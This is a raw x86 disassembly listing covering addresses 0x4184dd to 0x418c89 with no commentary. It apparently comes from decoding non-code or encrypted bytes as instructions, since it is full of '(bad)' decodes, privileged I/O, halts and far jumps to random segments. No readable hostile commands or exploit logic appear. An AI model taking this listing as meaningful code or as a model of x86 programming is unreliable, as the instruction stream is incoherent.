  4184dd:	popa   
  4184de:	das    
  4184df:	dec    esp
  4184e0:	fisubr WORD PTR [edx+0x3e]
  4184e3:	out    0xe4,al
  4184e5:	popa   
  4184e6:	test   BYTE PTR [esi+0x477b43c4],dl
  4184ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184ed:	scas   eax,DWORD PTR es:[edi]
  4184ee:	jg     0x4184c6
  4184f0:	mov    ah,0x72
  4184f2:	jns    0x418513
  4184f4:	cmp    eax,0x4487dfee
  4184f9:	sahf   
  4184fa:	out    dx,al
  4184fb:	lods   eax,DWORD PTR ds:[esi]
  4184fc:	pop    ds
  4184fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184fe:	add    dl,BYTE PTR [edx-0x740c6e33]
  418504:	mov    esi,0xf26505ea
  418509:	fcom   QWORD PTR [eax+eax*8-0x30]
  41850d:	nop
  41850e:	pop    ds
  41850f:	shl    BYTE PTR [eax*8+0x43dcc9e],1
  418516:	push   edx
  418517:	(bad)  
  418518:	out    0x79,eax
  41851a:	call   0x8821:0x2e694220
  418521:	lods   al,BYTE PTR ds:[esi]
  418523:	outs   dx,BYTE PTR ds:[esi]
  418524:	scas   eax,DWORD PTR es:[edi]
  418525:	jge    0x41858a
  418527:	cli    
  418528:	sub    DWORD PTR [esi],esp
  41852a:	pop    edx
  41852b:	mov    al,0x8a
  41852d:	imul   esp,esp,0x97a744a5
  418533:	push   0x36d02bb0
  418538:	or     al,0x72
  41853a:	jbe    0x418576
  41853c:	pop    eax
  41853d:	sbb    al,0x48
  41853f:	cmp    esi,0xffffffc7
  418542:	fs mov ebx,0xf9f43b81
  418548:	fadd   QWORD PTR [esp+ebp*8+0x718a099]
  41854f:	repnz popa 
  418551:	push   eax
  418552:	or     al,0x1d
  418554:	and    eax,0x8c7d2f12
  418559:	daa    
  41855a:	mov    bl,0x7c
  41855c:	push   esi
  41855d:	lahf   
  41855e:	sbb    eax,0xf043f25b
  418563:	jo     0x4184f2
  418565:	push   cs
  418566:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418567:	pop    ds
  418568:	xchg   ebx,eax
  418569:	enter  0xc0cf,0xe6
  41856d:	addr16 xor esi,edi
  418570:	push   cs
  418571:	clc    
  418572:	nop
  418573:	add    edx,DWORD PTR [ecx+0x7e56b1df]
  418579:	and    eax,0xee422c00
  41857e:	jmp    0xc74149a4
  418583:	pop    ds
  418584:	icebp  
  418585:	mov    BYTE PTR [edx-0x6b],dh
  418588:	ret    0x1cd6
  41858b:	les    esp,FWORD PTR [esi+0x5d539790]
  418591:	xchg   ebx,eax
  418592:	retf   0xe88f
  418595:	inc    esp
  418596:	icebp  
  418597:	adc    BYTE PTR [edi+0x60],ch
  41859a:	in     eax,0x10
  41859c:	xor    esi,DWORD PTR [ecx+0x14]
  41859f:	hlt    
  4185a0:	xlat   BYTE PTR ds:[ebx]
  4185a1:	dec    edi
  4185a2:	loope  0x41856c
  4185a4:	std    
  4185a5:	test   BYTE PTR [eax-0x5709088e],al
  4185ab:	add    eax,0xb66fa249
  4185b0:	icebp  
  4185b1:	push   ds
  4185b2:	mov    dl,0xad
  4185b4:	test   DWORD PTR [edx+0x6e8b8dd0],0x3de2c3c2
  4185be:	jl     0x418607
  4185c0:	inc    edx
  4185c1:	fild   QWORD PTR [esi]
  4185c3:	xor    ecx,DWORD PTR [ebp+0x37fd5998]
  4185c9:	sub    ebx,DWORD PTR [edx]
  4185cb:	out    dx,al
  4185cc:	mov    ebx,?
  4185ce:	sbb    BYTE PTR [eax+0x5e],cl
  4185d1:	inc    esi
  4185d2:	retf   0x8be1
  4185d5:	xchg   DWORD PTR [edx-0x35],ecx
  4185d8:	btr    DWORD PTR [ecx-0x11822334],esp
  4185df:	jmp    0xb118a379
  4185e4:	and    cl,BYTE PTR [ebp-0xe1f7122]
  4185ea:	sub    al,0xae
  4185ec:	sub    ah,ch
  4185ee:	iret   
  4185ef:	addr16 and al,0xe8
  4185f2:	clc    
  4185f3:	stc    
  4185f4:	sub    dh,ah
  4185f6:	int    0x50
  4185f8:	inc    edi
  4185f9:	test   dl,0x72
  4185fc:	mov    ds:0x7e5b1949,al
  418601:	arpl   WORD PTR [eax+0x5dd5d1b5],cx
  418607:	mul    edi
  418609:	fwait
  41860a:	pop    edx
  41860b:	into   
  41860c:	out    0x9a,eax
  41860e:	jns    0x4185a6
  418610:	lahf   
  418611:	and    bh,BYTE PTR [ebx+0x2c]
  418614:	in     al,dx
  418615:	cmp    DWORD PTR [ebp-0x60dc3482],ecx
  41861b:	jge    0x418666
  41861d:	push   0x151e7ef4
  418622:	(bad)  
  418623:	xor    dh,ch
  418625:	push   edx
  418626:	mov    edx,0xdc7c495c
  41862b:	loopne 0x418685
  41862d:	rol    cl,1
  41862f:	mov    ah,0x86
  418631:	clc    
  418632:	sub    BYTE PTR [edi],al
  418634:	inc    ebp
  418635:	mov    WORD PTR [esi+0x687327e],fs
  41863b:	ret    0x83b1
  41863e:	mov    ah,0xb9
  418640:	inc    ebx
  418641:	stos   DWORD PTR es:[edi],eax
  418642:	inc    eax
  418643:	pop    ss
  418644:	aad    0x89
  418646:	mov    edi,0xd96b3afe
  41864b:	ret    
  41864c:	pop    ds
  41864d:	mov    cl,0xed
  41864f:	or     al,0x15
  418651:	jl     0x418655
  418653:	sub    eax,0x8ab84165
  418658:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418659:	bound  esp,QWORD PTR [edi+0x36]
  41865c:	loope  0x41866b
  41865e:	mov    ch,0x18
  418660:	leave  
  418661:	pop    ss
  418662:	jl     0x4186ce
  418664:	inc    edi
  418665:	add    bh,BYTE PTR [ebp-0x7a]
  418668:	xlat   BYTE PTR ds:[ebx]
  418669:	jmp    0xc4fb3575
  41866e:	xchg   edi,eax
  41866f:	sub    DWORD PTR [esi-0x38],ebp
  418672:	sbb    DWORD PTR [ebx],edx
  418674:	outs   dx,DWORD PTR ds:[esi]
  418675:	rcl    DWORD PTR [ebx],cl
  418677:	dec    edx
  418678:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418679:	gs push esp
  41867b:	xlat   BYTE PTR gs:[ebx]
  41867d:	imul   ebx,DWORD PTR [esi+0x5f],0xd42c4077
  418684:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418685:	jno    0x41865d
  418687:	xor    cl,bh
  418689:	fsubr  st(2),st
  41868b:	mov    dl,0xd6
  41868d:	mov    WORD PTR [ecx+0x5e779677],fs
  418693:	jmp    0x4186b5
  418695:	hlt    
  418696:	jg     0x4186d9
  418698:	push   cs
  418699:	pop    ecx
  41869a:	jl     0x418659
  41869c:	inc    edx
  41869d:	mov    esp,0x45a23ef1
  4186a2:	out    dx,eax
  4186a3:	repnz and eax,0x3615774
  4186a9:	fld    TBYTE PTR [edx+0x61]
  4186ac:	das    
  4186ad:	loop   0x4186db
  4186af:	adc    eax,0x513e541
  4186b4:	in     al,dx
  4186b5:	push   ss
  4186b6:	in     eax,0xf0
  4186b8:	sbb    eax,0xe5038f22
  4186bd:	fsubr  QWORD PTR [edi+edi*4]
  4186c0:	sbb    al,BYTE PTR [ecx]
  4186c2:	stos   BYTE PTR es:[edi],al
  4186c3:	or     BYTE PTR [ebp-0x3509f2b1],0xf1
  4186ca:	mov    ah,0xcc
  4186cc:	xchg   edi,esi
  4186ce:	jno    0x418748
  4186d0:	mov    dh,0x21
  4186d2:	call   0xf502:0xd474d51a
  4186d9:	mov    bh,0x83
  4186db:	sub    DWORD PTR [ebx],ebx
  4186dd:	push   esp
  4186de:	push   edi
  4186df:	sbb    DWORD PTR [ecx+0x5c],esp
  4186e2:	sbb    bh,al
  4186e4:	inc    ecx
  4186e5:	push   es
  4186e6:	add    bl,dh
  4186e8:	retf   0x86f9
  4186eb:	mov    esp,0x6660f950
  4186f0:	(bad)  
  4186f1:	imul   edi,ecx,0x1f0a1c15
  4186f7:	hlt    
  4186f8:	ins    DWORD PTR es:[edi],dx
  4186f9:	adc    al,0x68
  4186fb:	mov    ebp,0xb4ef4929
  418700:	pusha  
  418701:	push   edx
  418702:	sub    eax,0x5d097dd4
  418707:	repz jecxz 0x418750
  41870a:	call   0xa161:0x344909ec
  418711:	aam    0x35
  418713:	adc    DWORD PTR [esi],edx
  418715:	xchg   ecx,eax
  418716:	fidiv  DWORD PTR [edx]
  418718:	mov    edi,0xcf628fba
  41871d:	mov    ah,0x41
  41871f:	pusha  
  418720:	imul   edi,DWORD PTR [ebx-0x4a899837],0x5e
  418727:	retf   0xdbc
  41872a:	jecxz  0x41878b
  41872c:	xor    ebx,ecx
  41872e:	fucomi st,st(3)
  418730:	sbb    BYTE PTR [ecx],cl
  418732:	data16 cmc 
  418734:	aaa    
  418735:	test   dh,ah
  418737:	jb     0x41871a
  418739:	pushf  
  41873a:	cmp    esp,edi
  41873c:	clc    
  41873d:	es jnp 0x418797
  418740:	ins    BYTE PTR es:[edi],dx
  418741:	stos   DWORD PTR es:[edi],eax
  418742:	(bad)  
  418743:	pop    eax
  418744:	mov    dl,BYTE PTR [esi-0x14]
  418747:	jl     0x4186d7
  418749:	sti    
  41874a:	inc    esi
  41874b:	dec    esp
  41874c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41874d:	ins    BYTE PTR es:[edi],dx
  41874e:	stc    
  41874f:	jecxz  0x418744
  418751:	mov    dl,dh
  418753:	jle    0x41871a
  418755:	in     al,0xf1
  418757:	out    dx,al
  418758:	or     ecx,DWORD PTR ds:0x60e6a326
  41875e:	mov    WORD PTR [ebx-0x4d],es
  418761:	aam    0x4c
  418763:	dec    esi
  418764:	ja     0x418779
  418766:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418767:	fidivr DWORD PTR [ebx-0x79]
  41876a:	push   ebp
  41876b:	fsubr  DWORD PTR [ecx+0x7ea2eaac]
  418771:	jae    0x41870e
  418773:	mov    ds:0x622aae15,eax
  418778:	out    0x3c,eax
  41877a:	dec    ebp
  41877b:	js     0x418719
  41877d:	add    eax,DWORD PTR [eax]
  41877f:	les    ecx,FWORD PTR [esi-0xa]
  418782:	cdq    
  418783:	mov    bh,0xec
  418785:	call   0xc6f85d1
  41878a:	int    0x53
  41878c:	inc    ebp
  41878d:	ffreep st(3)
  41878f:	arpl   WORD PTR [esi+0x1c],dx
  418792:	sbb    eax,0xe83fcf3a
  418797:	xchg   edi,eax
  418798:	(bad)  
  418799:	jnp    0x418736
  41879b:	aas    
  41879c:	test   BYTE PTR [esi],bh
  41879e:	adc    bh,BYTE PTR [ebx+0x10]
  4187a1:	inc    edx
  4187a2:	inc    edx
  4187a3:	adc    ebx,DWORD PTR [eax]
  4187a5:	fwait
  4187a6:	sub    BYTE PTR [esi-0x3c],cl
  4187a9:	pop    esp
  4187aa:	in     al,0x61
  4187ac:	xor    DWORD PTR [ecx-0x40],ecx
  4187af:	jne    0x418788
  4187b1:	jae    0x41878a
  4187b3:	mov    ss,WORD PTR [edi+0x759c8a6]
  4187b9:	sub    DWORD PTR [esi],ebx
  4187bb:	mov    DWORD PTR [ebx+0x6cf976c],ecx
  4187c1:	bound  ebx,QWORD PTR [esi]
  4187c3:	mov    ebp,0x9e7a3374
  4187c8:	inc    eax
  4187c9:	pop    ds
  4187ca:	arpl   sp,ax
  4187cc:	in     al,0x91
  4187ce:	push   esi
  4187cf:	out    dx,al
  4187d0:	retf   
  4187d1:	xor    ch,BYTE PTR [edi-0x4b]
  4187d4:	ins    DWORD PTR es:[edi],dx
  4187d5:	dec    ecx
  4187d6:	das    
  4187d7:	outs   dx,BYTE PTR ds:[esi]
  4187d8:	outs   dx,BYTE PTR ds:[esi]
  4187d9:	or     esi,0xffffffce
  4187dc:	ret    
  4187dd:	xchg   ch,cl
  4187df:	(bad)  
  4187e0:	scas   al,BYTE PTR es:[edi]
  4187e1:	dec    ebx
  4187e2:	inc    edx
  4187e3:	mov    esp,0xe93e8808
  4187e8:	xor    BYTE PTR [ebx],bh
  4187ea:	sti    
  4187eb:	or     al,0x95
  4187ed:	js     0x418793
  4187ef:	jmp    0x41884a
  4187f1:	(bad)  
  4187f2:	add    al,0x1f
  4187f4:	dec    ebp
  4187f5:	out    0x5a,al
  4187f7:	cwde   
  4187f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187f9:	push   ebx
  4187fa:	popa   
  4187fb:	sbb    DWORD PTR [edx+0x1fce2953],edi
  418801:	sub    al,0xb9
  418803:	aaa    
  418804:	mov    esi,0xf29b963e
  418809:	gs push esp
  41880b:	mov    ebp,DWORD PTR [edx+0xc]
  41880e:	outs   dx,BYTE PTR ds:[esi]
  41880f:	sub    BYTE PTR [edi-0x55f312cb],0x2f
  418816:	icebp  
  418817:	or     ebx,esi
  418819:	out    0xdb,eax
  41881b:	inc    ecx
  41881c:	std    
  41881d:	cmp    dl,BYTE PTR [edx+0x237674e]
  418823:	mov    bl,0xe4
  418825:	aaa    
  418826:	clc    
  418827:	mov    eax,ebx
  418829:	loopne 0x418814
  41882b:	and    BYTE PTR [esi-0x2e],cl
  41882e:	repnz and DWORD PTR [edx-0x6e],ebp
  418832:	jo     0x418897
  418834:	jbe    0x418878
  418836:	ins    DWORD PTR es:[edi],dx
  418837:	mov    al,0xb3
  418839:	jecxz  0x418872
  41883b:	cmp    DWORD PTR ds:0x883296e3,ebx
  418841:	popf   
  418842:	pop    edx
  418843:	and    ebp,DWORD PTR [edi-0x61b1635c]
  418849:	int    0xe8
  41884b:	hlt    
  41884c:	in     al,0x73
  41884e:	int    0xf0
  418850:	out    dx,eax
  418851:	(bad)  
  418852:	in     eax,0x8f
  418854:	mov    eax,0xfcf96468
  418859:	addr16 cs out 0x1b,al
  41885d:	dec    eax
  41885e:	scas   al,BYTE PTR es:[edi]
  41885f:	push   es
  418860:	adc    DWORD PTR [ebp-0xb],esi
  418863:	call   0xdc2edbb5
  418868:	push   edi
  418869:	stos   BYTE PTR es:[edi],al
  41886a:	xor    ebx,0x4c
  41886d:	xchg   edi,eax
  41886e:	mov    dh,0x65
  418870:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418871:	clc    
  418872:	rcl    esi,0xe8
  418875:	mov    ss,WORD PTR [eax+0x4a71881]
  41887b:	dec    edx
  41887c:	sub    esp,DWORD PTR [eax+0x31ddabd9]
  418882:	test   BYTE PTR [ebx],0xf1
  418885:	or     BYTE PTR [edx+0xd40bc2f],bl
  41888b:	xor    bh,0x50
  41888e:	mov    cs,WORD PTR [eax]
  418890:	je     0x418819
  418892:	sub    BYTE PTR [esi+0x4c],dh
  418895:	xchg   ebx,eax
  418896:	fwait
  418897:	jge    0x4188c9
  418899:	je     0x41885d
  41889b:	hlt    
  41889c:	test   eax,0x57937e18
  4188a1:	mov    edx,0xe0a16fdc
  4188a6:	jo     0x41886b
  4188a8:	inc    eax
  4188a9:	out    0x95,al
  4188ab:	out    0x94,al
  4188ad:	imul   ecx,esp,0xbf18ff77
  4188b3:	sbb    al,0x54
  4188b5:	xlat   BYTE PTR ds:[ebx]
  4188b6:	int3   
  4188b7:	iret   
  4188b8:	inc    esi
  4188b9:	nop
  4188ba:	mov    edi,0xe30b5d26
  4188bf:	pop    ss
  4188c0:	fadd   QWORD PTR [edi-0x74086ddc]
  4188c6:	pop    es
  4188c7:	dec    esp
  4188c8:	inc    eax
  4188c9:	xlat   BYTE PTR ds:[ebx]
  4188ca:	lea    edx,ss:[edx]
  4188cd:	mov    ch,0x6
  4188cf:	mov    BYTE PTR [edi+ebx*2],dh
  4188d2:	jns    0x41888f
  4188d4:	ins    DWORD PTR es:[edi],dx
  4188d5:	mov    edi,0xa4e48d97
  4188da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188db:	mov    edi,0x2e8ece7a
  4188e0:	int3   
  4188e1:	jp     0x418936
  4188e3:	mov    esp,?
  4188e5:	aaa    
  4188e6:	lea    ebp,[eax+0x71]
  4188e9:	mov    esp,0xbbd68a17
  4188ee:	mov    ebx,0x6812227a
  4188f3:	jne    0x418908
  4188f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188f6:	shl    DWORD PTR [ecx-0x5def13c9],cl
  4188fc:	iret   
  4188fd:	xchg   edx,eax
  4188fe:	mov    ds:0xdea7fa12,eax
  418903:	xchg   edi,eax
  418904:	xchg   ebx,eax
  418905:	sub    ebx,DWORD PTR [ebx]
  418907:	pop    es
  418908:	mov    ecx,0x5e241144
  41890d:	push   ebp
  41890e:	sbb    bl,BYTE PTR [edi+0x6f]
  418911:	push   cs
  418912:	mov    ds:0x7cb782a6,eax
  418917:	and    BYTE PTR [edx+0x4f3e1fd9],0xbd
  41891e:	repz xchg edi,eax
  418920:	(bad)  
  418922:	ficomp WORD PTR [esi-0x5f417a8f]
  418928:	xchg   ecx,eax
  418929:	sub    DWORD PTR [ecx-0x7e],ebx
  41892c:	or     al,0xff
  41892e:	adc    BYTE PTR [ebp-0x5e],bl
  418931:	int    0xa8
  418933:	mov    ecx,DWORD PTR [ebp+0x5c]
  418936:	icebp  
  418937:	adc    esi,DWORD PTR [edx-0x5d463653]
  41893d:	jne    0x418987
  41893f:	mov    dl,0x9b
  418941:	inc    edx
  418942:	jmp    0x418949
  418944:	push   cs
  418945:	(bad)  
  418946:	lods   al,BYTE PTR ds:[esi]
  418947:	xchg   ebp,eax
  418948:	pop    esp
  418949:	int    0xe7
  41894b:	imul   ch
  41894d:	dec    esp
  41894e:	sub    DWORD PTR [ecx+0x9cf6f24],esi
  418954:	dec    ecx
  418955:	pushf  
  418956:	js     0x418918
  418958:	push   edx
  418959:	pop    esp
  41895a:	push   ebx
  41895b:	stos   DWORD PTR es:[edi],eax
  41895c:	dec    eax
  41895d:	lock push ebx
  41895f:	retf   
  418960:	fistp  WORD PTR [ebp+0x590ff88]
  418966:	mov    dl,0xf3
  418968:	adc    eax,0x361d73c6
  41896d:	xor    al,0x3b
  41896f:	and    dh,BYTE PTR [edx+0x73]
  418972:	sti    
  418973:	cld    
  418974:	fwait
  418975:	or     BYTE PTR ds:0xe1720727,dl
  41897b:	out    0xd,eax
  41897d:	test   al,0x44
  41897f:	push   0xc50c84ed
  418984:	repz dec eax
  418986:	xor    esi,ebx
  418988:	cdq    
  418989:	mov    eax,ds:0x77471df1
  41898e:	loope  0x4189f6
  418990:	ds jle 0x418990
  418993:	adc    bh,BYTE PTR [edi]
  418995:	aaa    
  418996:	retf   
  418997:	std    
  418998:	push   0x36
  41899a:	and    eax,0x1673277b
  41899f:	inc    ebp
  4189a0:	test   BYTE PTR [edx],ch
  4189a2:	lods   al,BYTE PTR ds:[esi]
  4189a3:	leave  
  4189a4:	mov    ebx,0xdbdf8bcb
  4189a9:	cmp    al,BYTE PTR [esi+0x60]
  4189ac:	pop    ebx
  4189ad:	dec    ebx
  4189ae:	test   DWORD PTR [edi+0x49],edi
  4189b1:	das    
  4189b2:	popa   
  4189b3:	loope  0x4189e0
  4189b5:	das    
  4189b6:	js     0x41894d
  4189b8:	pop    ss
  4189b9:	ret    
  4189ba:	add    al,0xd1
  4189bc:	adc    DWORD PTR [edx],esp
  4189be:	jle    0x418966
  4189c0:	push   es
  4189c1:	ds pop esi
  4189c3:	(bad)  [edx-0x63]
  4189c6:	fst    QWORD PTR [eax+0x16]
  4189c9:	repnz add al,0x18
  4189cc:	test   BYTE PTR [edx],dh
  4189ce:	push   edi
  4189cf:	loop   0x418957
  4189d1:	add    ah,dl
  4189d3:	inc    esp
  4189d4:	push   es
  4189d5:	pop    edi
  4189d6:	pop    edx
  4189d7:	fisub  DWORD PTR ds:[ebx]
  4189da:	sub    edx,DWORD PTR [ebx-0x72a66b69]
  4189e0:	sub    BYTE PTR ds:0x3f456bc4,ch
  4189e6:	mov    bh,BYTE PTR [esi+0x275bfb88]
  4189ec:	retf   
  4189ed:	leave  
  4189ee:	cmp    dl,BYTE PTR ds:0x7e5482ec
  4189f4:	dec    ebp
  4189f5:	push   ecx
  4189f6:	jge    0x418a43
  4189f8:	cmp    BYTE PTR [ebx],dh
  4189fa:	imul   ecx,DWORD PTR [ecx+edx*2+0xdc7bb9c],0x43cec55c
  418a05:	mov    bl,BYTE PTR [ebx+0xb1bda30]
  418a0b:	cwde   
  418a0c:	mov    esp,0x86a8d07b
  418a12:	push   ecx
  418a13:	int3   
  418a14:	sub    al,0xa2
  418a16:	test   edi,0x10fb3b37
  418a1c:	jb     0x418a9c
  418a1e:	sub    dh,al
  418a20:	lods   al,BYTE PTR ds:[esi]
  418a21:	cmp    al,0xf5
  418a23:	pop    esi
  418a24:	and    ebp,ecx
  418a26:	mov    ds:0x7568c851,eax
  418a2b:	jne    0x418a0a
  418a2d:	xchg   edx,eax
  418a2e:	in     eax,dx
  418a2f:	xchg   ebx,eax
  418a30:	add    DWORD PTR [ebp-0x41],0xf38a826d
  418a37:	or     edx,edi
  418a39:	xor    DWORD PTR [ecx-0x2d37803a],ecx
  418a3f:	clc    
  418a40:	retf   
  418a41:	es clc 
  418a43:	mov    ds:0x2b685fed,al
  418a48:	scas   al,BYTE PTR es:[edi]
  418a49:	out    dx,al
  418a4a:	inc    edx
  418a4b:	test   al,0x58
  418a4d:	cwde   
  418a4e:	mov    dh,0xec
  418a50:	shl    ecx,0x5b
  418a53:	pop    esi
  418a54:	push   edi
  418a55:	mov    dh,0xd8
  418a57:	fadd   DWORD PTR [eax-0xc0f7bd7]
  418a5d:	pop    ecx
  418a5e:	sbb    ebp,DWORD PTR [ecx+ecx*2+0x2693d76c]
  418a65:	inc    edx
  418a66:	fdivr  st,st(6)
  418a68:	pop    es
  418a69:	lea    esp,[edx]
  418a6b:	cmp    DWORD PTR [ebp+0x3b],ecx
  418a6e:	sti    
  418a6f:	pop    esp
  418a70:	(bad)  
  418a71:	xchg   ebx,eax
  418a72:	shr    DWORD PTR [eax-0x39],0x40
  418a76:	mov    cl,0x16
  418a78:	push   0x70
  418a7a:	fsub   DWORD PTR [ebx+0x76]
  418a7d:	fwait
  418a7e:	lea    eax,[eax]
  418a80:	pushf  
  418a81:	push   ecx
  418a82:	sbb    al,0x4e
  418a84:	adc    DWORD PTR [esi],esp
  418a86:	(bad)
  418a89:	inc    esi
  418a8a:	mov    esp,0x233ca329
  418a8f:	fild   QWORD PTR [ebx+edi*1+0x632164f9]
  418a96:	mov    cs,WORD PTR [ecx+0x7d]
  418a99:	inc    esi
  418a9a:	or     dh,BYTE PTR ds:0xb96dedd6
  418aa0:	sti    
  418aa1:	mov    edi,esi
  418aa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418aa4:	sti    
  418aa5:	das    
  418aa6:	out    0xff,al
  418aa8:	adc    dh,BYTE PTR [ecx+0x59]
  418aab:	push   ecx
  418aac:	aam    0x5b
  418aae:	fistp  QWORD PTR [ebp-0x2]
  418ab1:	or     eax,0x1bb8959d
  418ab6:	fwait
  418ab7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ab8:	dec    esp
  418ab9:	jb     0x418b0b
  418abb:	ja     0x418b0a
  418abd:	out    dx,eax
  418abe:	pop    esi
  418abf:	add    dh,ch
  418ac1:	js     0x418ad7
  418ac3:	loop   0x418aad
  418ac5:	inc    edi
  418ac6:	dec    edi
  418ac7:	fsubr  QWORD PTR [esi-0x43]
  418aca:	inc    ebx
  418acb:	mov    ebp,0x528f4de2
  418ad0:	xor    BYTE PTR [ecx+0x9],cl
  418ad3:	xchg   ebp,eax
  418ad4:	jmp    0x418a94
  418ad6:	sti    
  418ad7:	div    DWORD PTR [ebp+0x5e]
  418ada:	add    ch,BYTE PTR [eax+0x48d06261]
  418ae0:	and    eax,0x5d5fe001
  418ae5:	add    al,0x6d
  418ae7:	rcl    ch,0xce
  418aea:	idiv   DWORD PTR [edx]
  418aec:	faddp  st(2),st
  418aee:	and    BYTE PTR [ebp-0x44],dl
  418af1:	jge    0x418b48
  418af3:	jl     0x418b58
  418af5:	out    dx,al
  418af6:	mov    cs,WORD PTR [edx+0x52]
  418af9:	lods   al,BYTE PTR ds:[esi]
  418afa:	xchg   edi,eax
  418afb:	jmp    0x8ca6:0x7138309a
  418b02:	mov    al,0x59
  418b04:	or     al,0x61
  418b06:	xor    esp,DWORD PTR [ebp-0x5dc22a01]
  418b0c:	aad    0x4a
  418b0e:	inc    esp
  418b0f:	pop    ebx
  418b10:	pop    ebx
  418b11:	jmp    0x8f6c:0xcb9d561f
  418b18:	sbb    BYTE PTR [ecx+edx*2-0x22],bl
  418b1c:	call   0x5a12:0x36ca352b
  418b23:	mov    ecx,0x795a1b03
  418b28:	jmp    0xb0fcfc0b
  418b2d:	jp     0x418ac0
  418b2f:	loop   0x418ab4
  418b31:	inc    edi
  418b32:	dec    esi
  418b33:	outs   dx,BYTE PTR ds:[esi]
  418b34:	pop    ss
  418b35:	jbe    0x418ba4
  418b37:	out    dx,al
  418b38:	or     BYTE PTR [edx],0xcf
  418b3b:	sub    DWORD PTR [ebp+0x58980999],ecx
  418b41:	sub    BYTE PTR es:[ecx],al
  418b44:	xor    bh,BYTE PTR [edx+0x64]
  418b47:	enter  0x709a,0x46
  418b4b:	scas   eax,DWORD PTR es:[edi]
  418b4c:	add    cl,al
  418b4e:	xor    eax,0xbf9c2777
  418b53:	sbb    eax,0x83b0260f
  418b58:	sub    eax,0x5698240c
  418b5d:	inc    ebx
  418b5e:	jns    0x418b6e
  418b60:	fucomip st,st(6)
  418b62:	jb     0x418aff
  418b64:	ret    
  418b65:	xor    dl,bl
  418b67:	sbb    al,0x8
  418b69:	push   ecx
  418b6a:	or     DWORD PTR [ebp+0x7a945694],0xbe0a1085
  418b74:	stc    
  418b75:	adc    cl,dl
  418b77:	out    0xe9,eax
  418b79:	repz mov edi,DWORD PTR [ebx]
  418b7c:	call   0x61a3c8d6
  418b81:	(bad)  
  418b82:	sti    
  418b83:	jno    0x418bd2
  418b85:	and    cl,bh
  418b87:	jae    0x418bf5
  418b89:	mov    eax,0x504aaa5b
  418b8e:	fnsave [edx+0x13]
  418b91:	pop    ds
  418b92:	cwde   
  418b93:	push   ecx
  418b94:	xchg   edi,eax
  418b95:	adc    bh,bh
  418b97:	sti    
  418b98:	pop    edi
  418b99:	adc    ch,bh
  418b9b:	sub    DWORD PTR [eax-0x68f88543],esp
  418ba1:	add    esp,ebp
  418ba3:	repnz stos DWORD PTR es:[edi],eax
  418ba5:	adc    BYTE PTR [edx+0x2d],0x33
  418ba9:	jmp    0x418b81
  418bab:	lods   eax,DWORD PTR ds:[esi]
  418bac:	and    eax,0x4007c976
  418bb1:	enter  0x5485,0xd6
  418bb5:	popf   
  418bb6:	inc    ebp
  418bb7:	cli    
  418bb8:	lods   al,BYTE PTR ds:[esi]
  418bb9:	rcr    DWORD PTR [eax],0x83
  418bbc:	popf   
  418bbd:	lock aaa 
  418bbf:	shr    DWORD PTR [edx-0x9f04604],1
  418bc5:	mov    dh,0x91
  418bc7:	cmp    eax,DWORD PTR [ecx]
  418bc9:	loope  0x418b5f
  418bcb:	loopne 0x418b7e
  418bcd:	inc    edx
  418bce:	(bad)  
  418bcf:	jnp    0x418b5b
  418bd1:	xor    bh,BYTE PTR es:[ecx+0x2c]
  418bd5:	js     0x418b66
  418bd7:	mov    eax,ds:0x744c8661
  418bdc:	jp     0x418ba1
  418bde:	sub    DWORD PTR [edi+0x4e],0x5e487e4
  418be5:	pop    edi
  418be6:	jno    0x418bf6
  418be8:	shl    DWORD PTR [edx-0xa],cl
  418beb:	sbb    eax,0x384953a0
  418bf0:	sti    
  418bf1:	jne    0x418ba3
  418bf3:	sub    DWORD PTR [eax+0x7e234189],ebx
  418bf9:	cwde   
  418bfa:	div    DWORD PTR [ebx+0x22cebdcd]
  418c00:	add    ebp,0x8d877d27
  418c06:	push   cs
  418c07:	clc    
  418c08:	xchg   BYTE PTR [ebx+0x21bd5082],ch
  418c0e:	das    
  418c0f:	dec    eax
  418c10:	push   ss
  418c11:	fdivr  DWORD PTR [ebx-0x5815f0d6]
  418c17:	sub    al,0xf7
  418c19:	cdq    
  418c1a:	repz pop ecx
  418c1c:	psubusb mm7,QWORD PTR [ebp+0x11cb1255]
  418c23:	out    dx,al
  418c24:	add    eax,0x1bbac4a5
  418c29:	xor    bh,bl
  418c2b:	call   0x150f4420
  418c30:	inc    DWORD PTR [eax]
  418c32:	aad    0x41
  418c34:	adc    BYTE PTR [esi-0x37],ch
  418c37:	fcom   DWORD PTR [eax]
  418c39:	pop    es
  418c3a:	sbb    DWORD PTR [ebx],0xffffff80
  418c3d:	aam    0xe4
  418c3f:	or     eax,0xa4f1c45e
  418c44:	and    DWORD PTR [ebp+0x63],ebx
  418c47:	data16 cmc 
  418c49:	jge    0x418bf0
  418c4b:	sti    
  418c4c:	je     0x418c10
  418c4e:	sub    ecx,DWORD PTR [ebp-0x4c87514c]
  418c54:	into   
  418c55:	daa    
  418c56:	mov    al,BYTE PTR [edi+0x25be7dbc]
  418c5c:	push   eax
  418c5d:	xchg   esi,eax
  418c5e:	cmp    BYTE PTR [ecx+ecx*1+0xf8f201a],dh
  418c65:	scas   al,BYTE PTR es:[edi]
  418c66:	jne    0x418c30
  418c68:	aam    0xa8
  418c6a:	das    
  418c6b:	cmp    edx,DWORD PTR [edx+ebx*1]
  418c6e:	aam    0x69
  418c70:	xor    BYTE PTR es:[ecx+0x53],dh
  418c74:	imul   eax,DWORD PTR [edi+0x53],0xffffff84
  418c78:	int3   
  418c79:	push   ss
  418c7a:	mov    ds:0x6aeca92d,eax
  418c7f:	or     edx,edx
  418c81:	jmp    0x418cbb
  418c83:	jge    0x418c83
  418c85:	rcl    dh,1
  418c87:	fcmovne st,st(4)
  418c89:	movntq QWORD PTR [ecx+0x7b],mm7
